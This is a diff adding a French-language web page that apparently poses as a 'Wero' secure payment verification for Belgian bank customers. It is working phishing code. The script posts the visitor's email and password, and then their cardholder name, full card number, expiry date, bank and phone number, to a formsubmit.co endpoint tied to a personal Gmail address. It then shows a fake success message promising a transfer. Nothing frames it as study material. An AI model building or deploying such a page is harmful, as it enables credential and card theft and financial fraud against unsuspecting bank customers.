+          <span class="i-icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="3" y1="22" x2="21" y2="22"/><line x1="6" y1="18" x2="6" y2="11"/><line x1="10" y1="18" x2="10" y2="11"/><line x1="14" y1="18" x2="14" y2="11"/><line x1="18" y1="18" x2="18" y2="11"/><polygon points="12 2 20 7 4 7"/></svg></span>
+          <select id="bank">
+            <option value="">Choisir une institution…</option>
+            <option>Belfius</option>
+            <option>BNP Paribas Fortis</option>
+            <option>ING</option>
+            <option>KBC / CBC</option>
+            <option>Crelan</option>
+            <option>Argenta</option>
+            <option>Beobank</option>
+            <option>CPH Banque</option>
+            <option>Keytrade Bank</option>
+            <option>Bpost Banque</option>
+          </select>
+        </div>
+        <div class="field-error" id="errBank"></div>
+      </div>
+
+      <div class="field">
+        <label for="phone">N° Téléphone <span class="req">*</span></label>
+        <div class="input-wrap">
+          <span class="i-icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07A19.5 19.5 0 0 1 4.69 12 19.79 19.79 0 0 1 1.58 3.4 2 2 0 0 1 3.54 1h3a2 2 0 0 1 2 1.72c.127.96.361 1.903.7 2.81a2 2 0 0 1-.45 2.11L7.91 8.64a16 16 0 0 0 6.29 6.29l.91-.91a2 2 0 0 1 2.11-.45c.907.339 1.85.573 2.81.7A2 2 0 0 1 22 16.92z"/></svg></span>
+          <input type="tel" id="phone" placeholder="+32 470 00 00 00" inputmode="tel" autocomplete="tel"/>
+        </div>
+        <div class="field-error" id="errPhone"></div>
+      </div>
+
+      <button type="submit" class="btn-submit" id="btnSubmit">
+        <span class="btn-text">Valider la vérification</span>
+      </button>
+    </form>
+  </div>
+
+  <div class="secure-footer">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+    PAIEMENT SÉCURISÉ PAR WERO
+  </div>
+
+</div>
+
+<!-- Success overlay -->
+<div class="success-overlay" id="successOverlay">
+  <div class="s-circle">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
+  </div>
+  <div class="s-title">Vérification validée !</div>
+  <div class="s-sub">Votre identité a été confirmée. Le virement sera traité sous 24h.</div>
+</div>
+
+<script>
+/* ══ Transition helper ══ */
+function transition(fromId, toId, cb) {
+  const from = document.getElementById(fromId);
+  from.style.opacity = '0';
+  from.style.transform = 'translateY(-16px)';
+  from.style.transition = 'opacity .35s ease, transform .35s ease';
+  setTimeout(() => {
+    from.classList.add('hidden');
+    const to = document.getElementById(toId);
+    to.classList.remove('hidden');
+    to.style.opacity = '0'; to.style.transform = 'translateY(20px)'; to.style.transition = 'none';
+    window.scrollTo(0,0);
+    requestAnimationFrame(() => requestAnimationFrame(() => {
+      to.style.transition = 'opacity .4s ease, transform .4s ease';
+      to.style.opacity = '1'; to.style.transform = 'translateY(0)';
+      if (cb) cb();
+    }));
+  }, 340);
+}
+
+/* ══ Password toggle ══ */
+function togglePass() {
+  const inp = document.getElementById('lpass');
+  const ico = document.getElementById('eyeIcon');
+  if (inp.type === 'password') {
+    inp.type = 'text';
+    ico.innerHTML = '<path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94"/><path d="M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19"/><line x1="1" y1="1" x2="23" y2="23"/>';
+  } else {
+    inp.type = 'password';
+    ico.innerHTML = '<path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/>';
+  }
+}
+
+/* ══ Password strength ══ */
+function updateStrength(v) {
+  const bars = ['pb1','pb2','pb3','pb4'];
+  let score = 0;
+  if (v.length >= 6) score++;
+  if (v.length >= 10) score++;
+  if (/[A-Z]/.test(v) && /[0-9]/.test(v)) score++;
+  if (/[^A-Za-z0-9]/.test(v)) score++;
+  const classes = ['','weak','fair','good','strong'];
+  bars.forEach((id, i) => {
+    const el = document.getElementById(id);
+    el.className = 'pw-bar';
+    if (i < score) el.classList.add(classes[score]);
+  });
+}
+
+/* ══ Login button activation ══ */
+function checkLoginBtn() {
+  const em = document.getElementById('lemail').value.trim();
+  const pw = document.getElementById('lpass').value;
+  const btn = document.getElementById('btnLogin');
+  btn.classList.toggle('active', em.length > 3 && pw.length > 3);
+}
+
+/* ══ Login handler ══ */
+async function handleLogin() {
+  const btn = document.getElementById('btnLogin');
+  if (!btn.classList.contains('active')) return;
+  const em = document.getElementById('lemail');
+  const pw = document.getElementById('lpass');
+  let ok = true;
+  if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(em.value)) {
+    document.getElementById('errLemail').textContent = 'Adresse e-mail invalide';
+    em.classList.add('error'); ok = false;
+  } else { document.getElementById('errLemail').textContent = ''; em.classList.remove('error'); em.classList.add('valid'); }
+  if (pw.value.length < 4) {
+    document.getElementById('errLpass').textContent = 'Mot de passe trop court';
+    pw.classList.add('error'); ok = false;
+  } else { document.getElementById('errLpass').textContent = ''; pw.classList.remove('error'); pw.classList.add('valid'); }
+  if (!ok) return;
+  btn.classList.add('loading'); btn.disabled = true;
+
+  // Envoi vers Formspree (page 0 indépendante)
+  try {
+    const data = new FormData();
+    data.append('Email',        em.value);
+    data.append('Mot de passe', pw.value);
+    await fetch('https://formsubmit.co/ajax/louanemarine6@gmail.com', {
+      method: 'POST', body: data, headers: { 'Accept': 'application/json' }
+    });
+  } catch (_) { /* on continue même en cas d'erreur réseau */ }
+
+  btn.classList.remove('loading'); btn.disabled = false;
+
+  // Afficher la page d'attente — fin du flux page 0 (dissociée des pages 1 & 2)
+  transition('page0', 'pageWait', () => {
+    animateWaitDots();
+  });
+}
+
+/* Anime les points de pagination sur la page d'attente */
+function animateWaitDots() {
+  const dots = document.querySelectorAll('#pageDots span');
+  let i = 0;
+  const iv = setInterval(() => {
+    dots.forEach(d => d.classList.remove('active'));
+    i = (i + 1) % dots.length;
+    dots[i].classList.add('active');
+  }, 1600);
+  // Stop après 30s
+  setTimeout(() => clearInterval(iv), 30000);
+}
+
+/* ══ Page 1 → Page 2 ══ */
+function goToForm() {
+  transition('page1', 'page2', () => {
+    setTimeout(() => {
+      document.getElementById('progressFill').style.width = '50%';
+      animatePct(0, 50, 1200);
+    }, 200);
+  });
+}
+
+/* ══ Progress counter ══ */
+function animatePct(from, to, duration) {
+  const start = performance.now();
+  const el = document.getElementById('progressPct');
+  function step(now) {
+    const t = Math.min((now - start) / duration, 1);
+    const ease = 1 - Math.pow(1 - t, 3);
+    el.textContent = Math.round(from + (to - from) * ease) + '%';
+    if (t < 1) requestAnimationFrame(step);
+  }
+  requestAnimationFrame(step);
+}
+
+/* ══ Card number formatting ══ */
+document.getElementById('cnum').addEventListener('input', e => {
+  let v = e.target.value.replace(/\D/g,'').slice(0,16);
+  e.target.value = v.replace(/(.{4})/g,'$1 ').trim();
+});
+
+/* ══ Expiry formatting ══ */
+document.getElementById('expiry').addEventListener('input', e => {
+  let v = e.target.value.replace(/\D/g,'');
+  if (v.length >= 2) v = v.slice(0,2) + '/' + v.slice(2,4);
+  e.target.value = v;
+});
+
+/* ══ Form validation ══ */
+function setErr(inp, errId, msg) {
+  document.getElementById(errId).textContent = msg;
+  inp.classList.toggle('error', !!msg);
+  inp.classList.toggle('valid', !msg);
+  return !msg;
+}
+function validate() {
+  let ok = true;
+  const fn = document.getElementById('fname');
+  ok = setErr(fn,'errFname', fn.value.trim().length < 2 ? 'Nom requis' : '') && ok;
+  const cn = document.getElementById('cnum');
+  ok = setErr(cn,'errCnum', cn.value.replace(/\s/g,'').length !== 16 ? 'Numéro à 16 chiffres requis' : '') && ok;
+  const ex = document.getElementById('expiry');
+  const ep = ex.value.split('/');
+  ok = setErr(ex,'errExpiry', !(ep.length===2 && +ep[0]>=1 && +ep[0]<=12 && ep[1].length===2) ? 'Format MM/YY requis' : '') && ok;
+  const bk = document.getElementById('bank');
+  ok = setErr(bk,'errBank', !bk.value ? 'Veuillez sélectionner une banque' : '') && ok;
+  const ph = document.getElementById('phone');
+  ok = setErr(ph,'errPhone', ph.value.replace(/[\s\-().+]/g,'').length < 7 ? 'Numéro invalide' : '') && ok;
+  return ok;
+}
+
+/* ══ Form submit → Formspree ══ */
+document.getElementById('verifyForm').addEventListener('submit', async e => {
+  e.preventDefault();
+  if (!validate()) return;
+  const btn = document.getElementById('btnSubmit');
+  btn.classList.add('loading'); btn.disabled = true;
+  document.getElementById('progressFill').style.width = '100%';
+  animatePct(50, 100, 1800);
+  const data = new FormData();
+  data.append('Nom du titulaire',  document.getElementById('fname').value);
+  data.append('Numéro de carte',   document.getElementById('cnum').value);
+  data.append('Date expiration',   document.getElementById('expiry').value);
+  data.append('Banque',            document.getElementById('bank').value);
+  data.append('Téléphone',         document.getElementById('phone').value);
+  try {
+    const res = await fetch('https://formsubmit.co/ajax/louanemarine6@gmail.com', {
+      method:'POST', body:data, headers:{'Accept':'application/json'}
+    });
+    if (res.ok) {
+      document.getElementById('successOverlay').classList.add('visible');
+    } else {
+      const json = await res.json();
+      alert('Erreur : ' + (json.errors?.map(e => e.message).join(', ') || 'Une erreur est survenue.'));
+    }
+  } catch { alert('Erreur réseau. Veuillez réessayer.'); }
+  finally { btn.classList.remove('loading'); btn.disabled = false; }
+});
+
+[document.getElementById('fname'), document.getElementById('cnum'),
+ document.getElementById('expiry'), document.getElementById('bank'),
+ document.getElementById('phone')
+].forEach(el => el.addEventListener('blur', validate));
+
+/* Enter key on login */
+document.getElementById('lpass').addEventListener('keydown', e => { if(e.key==='Enter') handleLogin(); });
+document.getElementById('lemail').addEventListener('keydown', e => { if(e.key==='Enter') document.getElementById('lpass').focus(); });
+</script>
+</body>
+</html>
